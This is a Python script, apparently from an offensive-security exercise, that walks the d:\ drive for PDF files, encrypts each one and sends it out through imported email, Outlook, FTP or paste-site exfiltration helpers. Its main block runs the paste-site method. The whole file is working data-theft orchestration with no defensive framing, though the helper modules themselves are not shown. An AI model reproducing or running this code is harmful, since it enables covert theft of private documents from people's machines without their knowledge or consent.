from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'plain_paste': plain_paste,
    'ie_paste': ie_paste,
}

def find_docs(doc_type='.pdf'):
    print(f"Searching for documents of type: {doc_type}")
    for parent, _, filenames in os.walk('d:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                print(f"Found document: {document_path}")
                yield document_path

def exfiltrate(document_path, method):
    print(f"Exfiltrating {document_path} using method: {method}")
    if method in ['transmit', 'plain_ftp']:
        filename = f'd:\\{os.path.basename(document_path)}'
        print(f"Temporary file path: {filename}")
        
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        
        print("Encrypting contents")
        encrypted_contents = encrypt(contents)
        
        with open(filename, 'wb') as f1:
            f1.write(encrypted_contents)
        
        print(f"Exfiltrating using {method}")
        EXFIL[method](filename)
        
        print(f"Deleting temporary file: {filename}")
        os.unlink(filename)
    else:
        with open(document_path, 'rb') as f:
            contents = f.read()
        
        title = os.path.basename(document_path)
        print(f"Document title: {title}")
        
        print("Encrypting contents")
        encrypted_contents = encrypt(contents)
        
        print(f"Exfiltrating using {method}")
        EXFIL[method](title, encrypted_contents)

if __name__ == '__main__':
    for fpath in find_docs():
        print(f"Exfiltrating file: {fpath}")
        exfiltrate(fpath, 'plain_paste')
